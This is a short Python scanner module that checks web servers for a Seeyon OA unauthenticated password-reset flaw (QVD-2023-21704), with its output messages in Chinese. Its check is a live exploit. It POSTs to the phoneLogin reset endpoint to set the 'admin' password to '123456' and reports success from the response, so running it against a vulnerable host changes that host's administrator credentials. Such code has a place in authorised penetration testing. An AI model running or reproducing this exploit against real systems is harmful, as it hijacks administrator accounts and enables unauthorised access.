# zealot_oa_scan.py

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests.exceptions import Timeout

def scan_zealot_oa(url, proxies, headers, append_to_output):
    path = "/seeyon/rest/phoneLogin/phoneCode/resetPassword"
    data = '''{"loginName":"admin","password":"123456"}'''
    encodetext = url + path
    append_to_output("===================================================================", "green")
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        req = requests.post(encodetext, data=data, headers=headers, verify=False, timeout=15, proxies=proxies)
        res = req.text

        if req.status_code == 200 and 'success' in res and 'message' in res:
            append_to_output(f"[+] {url} 存在致远oa前台密码修改(QVD-2023-21704)！！！！", "red")
        else:
            append_to_output(f"[-] {url} 不存在致远oa前台密码修改(QVD-2023-21704)", "green")
    except Timeout:
        append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
    except Exception as e:
        if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
            append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
        else:
            append_to_output(str(e), "yellow")
